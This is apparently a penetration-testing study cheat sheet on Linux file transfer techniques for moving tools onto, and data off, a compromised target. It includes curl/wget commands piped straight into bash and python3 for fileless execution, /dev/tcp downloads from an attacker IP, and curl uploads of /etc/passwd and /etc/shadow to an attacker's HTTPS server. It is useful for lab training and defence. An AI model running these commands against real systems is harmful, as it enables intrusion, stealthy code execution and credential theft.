# Linux Files Transfer

## Methodology

```
Base64 → wget/curl → Fileless (pipe) → /dev/tcp → SCP → Web Server → Upload Server
```

Always verify with **md5sum** on both ends.

---

## DOWNLOAD Methods (Attacker → Linux Target)

### 1. Base64 Encode/Decode (no network)

```bash
# Attacker: encode
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Target: decode
echo -n '<base64string>' | base64 -d > id_rsa
md5sum id_rsa   # verify
```

---

### 2. wget / curl

```bash
# wget
wget https://<IP>/LinEnum.sh -O /tmp/LinEnum.sh

# curl
curl -o /tmp/LinEnum.sh https://IP/LinEnum.sh
```

---

### 3. Fileless (pipe directly into interpreter — never touches disk)

```bash
# curl → bash
curl https://IP/LinEnum.sh | bash

# wget → python3
wget -qO- https://IP/script.py | python3
```

> ⚠️ Some payloads like `mkfifo` still write temp files despite fileless execution
> 

---

### 4. /dev/tcp (pure Bash — no tools needed)

```bash
# Works if Bash ≥ 2.04 compiled with --enable-net-redirections
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

> Best when wget/curl are not available
> 

---

### 5. SCP (SSH-based, encrypted)

```bash
# Enable SSH on attacker first
sudo systemctl enable ssh
sudo systemctl start ssh

# Download from attacker to target
scp user@192.168.49.128:/root/file.txt .
```

---

## UPLOAD Methods (Linux Target → Attacker)

### 1. curl POST to Upload Server (HTTPS)

```bash
# Attacker: setup HTTPS upload server
pip3 install uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Target: upload files
curl -X POST https://192.168.49.128/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure    # needed for self-signed cert
```

---

### 2. Start Web Server on Target → Pull from Attacker

```bash
# On target (compromised machine) — spin up quick web server
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# On attacker — pull the file
wget http://192.168.49.128:8000/filetotransfer.txt
```

---

### 3. SCP Upload

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

---

## Quick Reference

| Method | Tool Needed | Network | Notes |
| --- | --- | --- | --- |
| Base64 | None | ❌ | Best when no network |
| wget/curl | wget or curl | ✅ HTTP/S | Most common |
| Fileless pipe | wget or curl | ✅ HTTP/S | No disk write |
| /dev/tcp | Bash only | ✅ HTTP | No tools needed |
| SCP | SSH access | ✅ TCP 22 | Encrypted |
| Upload server | Python + curl | ✅ HTTPS | For exfil |
| Mini web server | Python/PHP/Ruby | ✅ HTTP | Serve files from target |

---

## Key Takeaways

- Linux malware primarily uses **HTTP/HTTPS** for transfers (most reliable, least filtered)
- **Fileless execution** (pipe to bash/python) = no file on disk → harder to detect
- `/dev/tcp` is a hidden gem — works with **zero tools**, just Bash
- When compromising a web server, you may already have PHP/Python → instant web server
- **SCP** is cleanest for encrypted transfers when SSH port is open
- Always create **temp users** for SCP transfers — don't reuse your main creds